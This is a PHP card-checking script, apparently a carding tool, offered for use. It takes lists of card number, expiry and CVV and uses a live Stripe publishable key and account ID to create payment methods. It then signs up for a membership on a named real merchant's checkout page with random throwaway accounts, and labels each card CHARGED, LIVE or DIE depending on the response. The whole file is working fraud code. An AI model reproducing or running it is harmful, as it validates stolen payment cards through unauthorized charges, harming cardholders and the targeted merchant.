<?php

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
};

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function random_strings($length_of_string) {
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
    0, $length_of_string); 
}

$rnd = 'star'.random_strings(6).'';
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$ccn = $cc; // Define the $ccn variable
$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

// Step 1: Fetch the page to get the nonce value
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '
https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$pageContent = curl_exec($ch);
curl_close($ch);

// Step 2: Extract the nonce value from the page content
$nonce = getStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');

// Step 3: Use the nonce value in the next request
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-encoding: gzip, deflate, br, zstd';
$headers[] = 'accept-language: en';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0432026b-8a26-4a84-8fb8-dc8fc44de06425b4c2&muid=1706e7fe-c681-4e38-a5ba-2a757d5c92ba130bc5&sid=9892d7c1-33f1-486c-a21d-046e58505b19272a43&pasted_fields=number&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+split-card-element&referrer=https%3A%2F%2Fapp.keymotivators.com&time_on_page=62262&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HAQ6EGQ34MnJsRP');
$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '
https://app.keymotivators.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: app.keymotivators.com',
    'path: /membership-account/membership-checkout/',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'cookie: __stripe_mid=1706e7fe-c681-4e38-a5ba-2a757d5c92ba130bc5; __stripe_sid=9892d7c1-33f1-486c-a21d-046e58505b19272a43',
    'origin: https://app.keymotivators.com',
    'referer: https://app.keymotivators.com/membership-account/membership-checkout/',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&other_discount_code=&username='.$rnd.'pper8&password=criticismupper8&password2=criticismupper8&bemail='.$rnd.'er8%40aol.com&bconfirmemail='.$rnd.'er8%40aol.com&fullname=&CardType=mastercard&discount_code=&i_m_agreeing_to_a_6_months_subscription=1&i_m_agreeing_to_a_6_months_subscription_checkbox=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
$result2 = curl_exec($ch);

$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
#cvv
if(strpos($result2, "Membership Confirmation")) {
    echo '#CHARGED</span> </span>CC ⌁ '.$lista.'</span><br>RESULT ⌁ Membership Confirmed ! ✔️</span><br>';
}
#ccn
elseif(strpos($result2, "Your card's security code is incorrect.")) {
    echo '#LIVE</span> </span>CC ⌁ '.$lista.'</span><br>RESULT ⌁ '.$msg.'</span><br>';
}
#declined
elseif(strpos($result2, "Your card does not support this type of purchase.")) {
    echo '#LIVE</span> </span>CC ⌁ '.$lista.'</span><br>RESULT ⌁ '.$msg.'</span><br>';
}
elseif(strpos($result2, "Your card has insufficient funds.")) {
    echo '#LIVE</span> </span>CC ⌁ '.$lista.'</span><br>RESULT ⌁ '.$msg.'</span><br>';
}
else {
    echo '#DIE</span> </span>CC ⌁ '.$lista.'</span>  <br>RESULT ⌁ '.$msg.'</span><br>';
}
?>
